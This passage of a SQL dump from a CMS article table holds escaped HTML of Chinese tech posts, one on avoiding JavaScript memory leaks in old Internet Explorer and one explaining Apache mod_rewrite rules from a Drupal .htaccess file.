style=&quot;color:#dd0000;&quot;&gt;&quot;lalalalala&quot;&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&lt;/span&gt;&lt;span style=&quot;color:#ff8000;&quot;&gt;//此处将string转换成object&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;alert&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;s&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;length&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&lt;/span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;wbr&gt;DE&amp;gt;&lt;/div&gt;\r\n&lt;em&gt;复制代码&lt;/em&gt;&lt;/div&gt;\r\n这个太容易了，算不上正经方案。不过类型转换泄露也就这一种处理方法了。&lt;br /&gt;\r\n&lt;ul&gt;&lt;li&gt;&lt;strong&gt;避免事件导致的循环引用&lt;/strong&gt;&lt;/li&gt;\r\n&lt;/ul&gt;\r\n在比较成熟的js程序员里，把事件函数写成闭包是再正常不过了： &lt;div style=&quot;background:none repeat-y scroll 0px 0px #f7f7f7;&quot;&gt;&lt;div&gt;&lt;span style=&quot;color:#007700;&quot;&gt;function&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;A&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(){&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;document&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;createElement&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#dd0000;&quot;&gt;&quot;div&quot;&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;on&lt;wbr&gt;click&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=function(){&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;alert&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#dd0000;&quot;&gt;&quot;hi&quot;&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;/span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;wbr&gt;DE&amp;gt;&lt;/div&gt;\r\n&lt;em&gt;复制代码&lt;/em&gt;&lt;/div&gt;\r\n这将导致内存泄露。按照IBM那两位老大的说法，当然是把函数放外面或者a=null就没问题了，不过还要访问A()里面的变量呢？假如有下面的代码： &lt;div style=&quot;background:none repeat-y scroll 0px 0px #f7f7f7;&quot;&gt;&lt;div&gt;&lt;span style=&quot;color:#007700;&quot;&gt;function&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;A&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(){&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;document&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;createElement&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#dd0000;&quot;&gt;&quot;div&quot;&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;document&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;createElement&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#dd0000;&quot;&gt;&quot;div&quot;&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;on&lt;wbr&gt;click&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=function(){&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;alert&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;outerHTML&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;/span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;wbr&gt;DE&amp;gt;&lt;/div&gt;\r\n&lt;em&gt;复制代码&lt;/em&gt;&lt;/div&gt;\r\n如何将它的逻辑表达出来 还避免内存泄露？分析一下这个内存泄露的形式：只要on&lt;wbr&gt;click的外部环境中不包含a那么，就不会泄露。那么办法有2个一是将环境到a的引用断开另一个是将function到环境的引用断开，但是，如果要在函数中访问b就不能将Function放到外面，如果要返回a的值，就不能a=null，怎么办呢？&lt;br /&gt;\r\n解决方案1：&lt;br /&gt;\r\n构造一个不含a的新环境 &lt;div style=&quot;background:none repeat-y scroll 0px 0px #f7f7f7;&quot;&gt;&lt;div&gt;&lt;span style=&quot;color:#007700;&quot;&gt;function&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;A&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(){&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;document&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;createElement&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#dd0000;&quot;&gt;&quot;div&quot;&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;document&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;createElement&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#dd0000;&quot;&gt;&quot;div&quot;&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;on&lt;wbr&gt;click&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;BuildEvent&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\nfunction&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;BuildEvent&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;)&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n{&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return&amp;nbsp;function(){&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;alert&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;outerHTML&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;/span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;wbr&gt;DE&amp;gt;&lt;/div&gt;\r\n&lt;em&gt;复制代码&lt;/em&gt;&lt;/div&gt;\r\na本身可以通过this访问，将其它需要访问的外层函数变量传递给BuildEvent就可以了。保持BuildEvent定义和调用的参数名一致，会带来方便。&lt;br /&gt;\r\n解决方案2：&lt;br /&gt;\r\n在return 之后a=null,不可能？ 看看下面： &lt;div style=&quot;background:none repeat-y scroll 0px 0px #f7f7f7;&quot;&gt;&lt;div&gt;&lt;span style=&quot;color:#007700;&quot;&gt;function&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;A&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(){&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;try{&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;document&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;createElement&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#dd0000;&quot;&gt;&quot;div&quot;&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;document&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;createElement&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#dd0000;&quot;&gt;&quot;div&quot;&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;on&lt;wbr&gt;click&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&amp;nbsp;function(){&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;alert&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;b&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;outerHTML&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;finally&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;{&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;/span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;wbr&gt;DE&amp;gt;&lt;/div&gt;\r\n&lt;em&gt;复制代码&lt;/em&gt;&lt;/div&gt;\r\nfinally在try之后执行，如果finall块不返回值，才会返回try块的返回值。&lt;br /&gt;\r\n&lt;ul&gt;&lt;li&gt;延迟appendChild&lt;/li&gt;\r\n&lt;/ul&gt;\r\n还记得函数的lazyinitalize吧，对于ie恶心至极的DOM操作泄露，我们需要用类似的方法去处理。在一个函数中构造一个复杂对象，在需要的时候将之appendChild到DOM树上，这是很常见的做法，但在IE6中，这样做将导致所谓的&quot;插入顺序内存泄露&quot;，没有别的办法，我们只能用一个数组parts保存子节点，编写一个appendTo方法先序遍历节点树，去把它挂在某个DOM节点上。 &lt;div style=&quot;background:none repeat-y scroll 0px 0px #f7f7f7;&quot;&gt;&lt;div&gt;&lt;span style=&quot;color:#007700;&quot;&gt;function&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;appendTo&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;Element&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;)&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n...{&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;Element&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;appendChild&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;this&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if(!&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;this&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;parts&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;)return;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for(var&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;i&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;i&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;this&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;parts&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;length&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;i&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;++)&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;parts&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;appendTo&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;this&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;/span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;wbr&gt;DE&amp;gt;&lt;/div&gt;\r\n&lt;em&gt;复制代码&lt;/em&gt;&lt;/div&gt;\r\n&lt;ul&gt;&lt;li&gt;垃圾箱&lt;/li&gt;\r\n&lt;/ul&gt;\r\n对于ie7，我比较无可奈何，因为DOM对象不会被CG程序回收，只有离开页面时会被回收，所以我的建议是：使用DOM要有节制，尽量多用innerHTML吧...... good luck.&lt;br /&gt;\r\n一旦你使用了DOM对象，千万不要试图o=null，你可以设置一个叫做Garbage的div并且将其display设置为none，将不用的DOM对象存入其中（就是appendChild上去）就好了&lt;br /&gt;\r\n&lt;ul&gt;&lt;li&gt;代理对象&lt;/li&gt;\r\n&lt;/ul&gt;\r\n这是Ext的做法，这里只是顺带提一下。将每个元素用一个&quot;代理对象&quot;操作，不论appendChild还是其他操作都不是对DOM对象本身的操作，而是通过这个代理对象操作。这是一个很不错的Proxy模式，不过要想避免泄露还是需要一点功夫的，并非用了Proxy之后就不会泄露，有时反而更容易泄露。&lt;br /&gt;\r\n5 .ＦＡＱ&lt;br /&gt;\r\n&lt;ul type=&quot;1&quot;&gt;&lt;li&gt;内存泄露是内存占用很大么？ 不是，即使1byte内存也叫做内存泄露。 &lt;/li&gt;\r\n&lt;li&gt;程序中提示,内存不足，是内存泄露么？不是，这一般是无限递归函数调用导致栈内存溢出。 &lt;/li&gt;\r\n&lt;li&gt;内存泄露是哪个区域泄露？堆区，栈区是不会泄露的。 &lt;/li&gt;\r\n&lt;li&gt;window对象是DOM对象么？不是，window对象参与的循环引用不会内存泄露。 &lt;/li&gt;\r\n&lt;li&gt;内存泄露后果是什么？大多数时候后果不很严重，但过多DOM操作会导致网页执行变慢。 &lt;/li&gt;\r\n&lt;li&gt;跳转页面后，内存泄露仍然存在么？仍然存在，直到关闭浏览器。 &lt;/li&gt;\r\n&lt;li&gt;FireFox也会内存泄露么？FF2仍然有内存泄露&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;/li&gt;\r\n&lt;/ul&gt;\r\n', 1, 1, 0, 0, 1305018825, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(108, 1, 'apache重写规则详解', '', '', '&lt;pre&gt;# Various rewrite rules.&lt;br /&gt;\r\n&lt;span style=&quot;color:#0000ff;&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&quot;color:#800000;&quot;&gt;IfModule&lt;/span&gt; &lt;span style=&quot;color:#ff0000;&quot;&gt;mod_rewrite&lt;/span&gt;.&lt;span style=&quot;color:#ff0000;&quot;&gt;c&lt;/span&gt;&lt;span style=&quot;color:#0000ff;&quot;&gt;&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n  RewriteEngine on&lt;br /&gt;\r\n&lt;br /&gt;\r\n  # If your site can be accessed both with and without the ''www.'' prefix, you&lt;br /&gt;\r\n  # can use one of the following settings to redirect users to your preferred&lt;br /&gt;\r\n  # URL, either WITH or WITHOUT the ''www.'' prefix. Choose ONLY one option:&lt;br /&gt;\r\n  #&lt;br /&gt;\r\n  # To redirect all users to access the site WITH the ''www.'' prefix,&lt;br /&gt;\r\n  # (http://example.com/... will be redirected to http://www.example.com/...)&lt;br /&gt;\r\n  # adapt and uncomment the following:&lt;br /&gt;\r\n  # RewriteCond %{HTTP_HOST} ^example\\.com$ [NC]&lt;br /&gt;\r\n  # RewriteRule ^(.*)$ http://www.example.com/$1 [L,R=301]&lt;br /&gt;\r\n  #&lt;br /&gt;\r\n  # To redirect all users to access the site WITHOUT the ''www.'' prefix,&lt;br /&gt;\r\n  # (http://www.example.com/... will be redirected to http://example.com/...)&lt;br /&gt;\r\n  # uncomment and adapt the following:&lt;br /&gt;\r\n  # RewriteCond %{HTTP_HOST} ^www\\.example\\.com$ [NC]&lt;br /&gt;\r\n  # RewriteRule ^(.*)$ http://example.com/$1 [L,R=301]&lt;br /&gt;\r\n&lt;br /&gt;\r\n  # Modify the RewriteBase if you are using Drupal in a subdirectory or in a&lt;br /&gt;\r\n  # VirtualDocumentRoot and the rewrite rules are not working properly.&lt;br /&gt;\r\n  # For example if your site is at http://example.com/drupal uncomment and&lt;br /&gt;\r\n  # modify the following line:&lt;br /&gt;\r\n  # RewriteBase /drupal&lt;br /&gt;\r\n  #&lt;br /&gt;\r\n  # If your site is running in a VirtualDocumentRoot at http://example.com/,&lt;br /&gt;\r\n  # uncomment the following line:&lt;br /&gt;\r\n  # RewriteBase /&lt;br /&gt;\r\n&lt;br /&gt;\r\n  # Rewrite URLs of the form ''x'' to the form ''index.php?q=x''.&lt;br /&gt;\r\n  RewriteCond %{REQUEST_FILENAME} !-f&lt;br /&gt;\r\n  RewriteCond %{REQUEST_FILENAME} !-d&lt;br /&gt;\r\n  RewriteCond %{REQUEST_URI} !=/favicon.ico&lt;br /&gt;\r\n  RewriteRule ^(.*)$ index.php?q=$1 [L,QSA]&lt;br /&gt;\r\n&lt;span style=&quot;color:#0000ff;&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;color:#800000;&quot;&gt;IfModule&lt;/span&gt;&lt;span style=&quot;color:#0000ff;&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;RewriteEngine on&lt;br /&gt;\r\n&lt;/strong&gt;为重写引擎开关，如果设为off,则任何重写规则定义将不被应用，该开关的另一好处就是如果为了临时拿掉重写规则，则改为off再重启动Apache即可，不必将下面一条条的重写规则注释掉。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;RewriteCond 条件重写规则，当满足后面定义的条件后才会应用下面的重写规则。&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;RewriteCond 的语法如下：&lt;/strong&gt; &lt;/p&gt;\r\n&lt;p&gt;RewriteCond&amp;nbsp; TestString CondPattern [flags] &lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;TestString &lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;TestString 是一个纯文本的字符串，但是也可以包含一些扩展的成分，这里就是通过 %{NAME_OF_VARIABLE} 引用的服务器变量。 &lt;/p&gt;\r\n&lt;p&gt;服务器变量： &lt;/p&gt;\r\n&lt;p&gt;REQUEST_FILENAME&amp;nbsp; 是与请求相匹配的完整的本地文件系统的文件路径名。 &lt;/p&gt;\r\n&lt;p&gt;REQUEST_URI 是在HTTP请求行中所请求的资源(比如:&quot;/index.html&quot;)。 &lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;CondPattern &lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;CondPattern是条件模式，即一个应用于当前TestString实例的正则表达式。TestString将被首先计算，然后再与CondPattern匹配。 &lt;/p&gt;\r\n&lt;p&gt;比如： RewriteCond %{REQUEST_URI} !=/favicon.ico&amp;nbsp; 